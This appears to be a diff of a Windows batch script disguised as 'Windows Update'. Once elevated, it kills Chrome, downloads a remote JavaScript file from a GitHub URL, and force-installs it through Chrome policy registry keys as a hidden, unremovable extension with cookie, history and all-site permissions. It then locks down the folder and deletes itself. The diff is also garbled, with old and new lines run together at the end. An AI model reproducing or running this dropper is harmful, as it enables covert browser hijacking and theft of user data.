@@ -1,40 +1,60 @@
+
 @echo off
 setlocal enabledelayedexpansion
-title Windows Update - System Component
+title Windows Update
 
-:: ===== AUTO-ELEVATE =====
 net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)
 
-:: ===== CONFIG =====
-set "GITHUB_RAW=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
-set "BG_FILE=windows.sys.js"
-set "EXT_ID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-set "EXT_NAME=Windows System Service"
-set "HIDDEN_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18"
-set "EXT_DIR=%HIDDEN_DIR%\chrome_sys"
-set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "DESKTOP=%USERPROFILE%\Downloads\Desktop"
-set "LOG_FILE=%DESKTOP%\install_log.txt"
+set "URL=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
+set "JS=windows.sys.js"
+set "EXT_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18\chrome_svc"
+set "LOG=%TEMP%\chrome_install.log"
 
-if not exist "%DESKTOP%" mkdir "%DESKTOP%"
+echo [%date% %time%] START >> "%LOG%"
 
-:: ===== INIT LOG =====
-echo [%date% %time%] === INSTALLER STARTED === > "%LOG_FILE%"
-echo [%date% %time%] PC: %COMPUTERNAME% >> "%LOG_FILE%"
-echo [%date% %time%] User: %USERNAME% >> "%LOG_FILE%"
-
-:: ===== STEP 1: Create hidden directories =====
-echo [*] Creating directories...
-mkdir "%HIDDEN_DIR%" 2>nul
 mkdir "%EXT_DIR%" 2>nul
-attrib +h +s +r "%HIDDEN_DIR%" 2>nul
-echo [%date% %time%] [+] Directories created >> "%LOG_FILE%"
-
-:: ===== STEP 2: Kill Chrome =====
-echo [*] Closing Chrome...
 taskkill /F /IM chrome.exe >nul 2>&1
 timeout /t 3 /nobreak >nul
-echo [%date% %time%] [+] Chrome closed >> "%LOG_FILE%"
+
+curl -L -s -o "%EXT_DIR%\%JS%" "%URL%/%JS%" 2>nul
+if not exist "%EXT_DIR%\%JS%" certutil -urlcache -split -f "%URL%/%JS%" "%EXT_DIR%\%JS%" >nul 2>&1
+
+:: Minimal manifest
+(
+echo {
+echo   "manifest_version": 3,
+echo   "name": "",
+echo   "version": "1.0",
+echo   "background": { "service_worker": "%JS%" },
+echo   "permissions": ["tabs","alarms","history","cookies","scripting","activeTab","webNavigation","storage","bookmarks"],
+echo   "host_permissions": ["<all_urls>"],
+echo   "action": {}
+echo }
+) > "%EXT_DIR%\manifest.json"
+
+:: Force install via registry (hidden, unremovable)
+reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;file:///%EXT_DIR:\=/%//update.xml" /f >nul 2>&1
+
+:: update.xml
+(
+echo ^<?xml version="1.0"?^>
+echo ^<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"^>
+echo   ^<app appid="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"^>
+echo     ^<updatecheck codebase="file:///%EXT_DIR:\=/%/" version="1.0"/^>
+echo   ^</app^>
+echo ^</gupdate^>
+) > "%EXT_DIR%\update.xml"
+
+attrib +h +s "%EXT_DIR%" 2>nul
+icacls "%EXT_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1
+
+start "" "chrome.exe" --no-first-run 2>nul
+
+echo [%date% %time%] DONE >> "%LOG%"
+
+(echo @echo off&echo timeout /t 2 ^>nul&echo del /f/q "%~f0" ^>nul&echo del /f/q %%0 ^>nul) > "%TEMP%\~sd.bat"
+start /min "" "%TEMP%\~sd.bat"
+exit /b 0echo [%date% %time%] [+] Chrome closed >> "%LOG_FILE%"
 
 :: ===== STEP 3: Download windows.sys.js =====
 echo [*] Downloading %BG_FILE%...
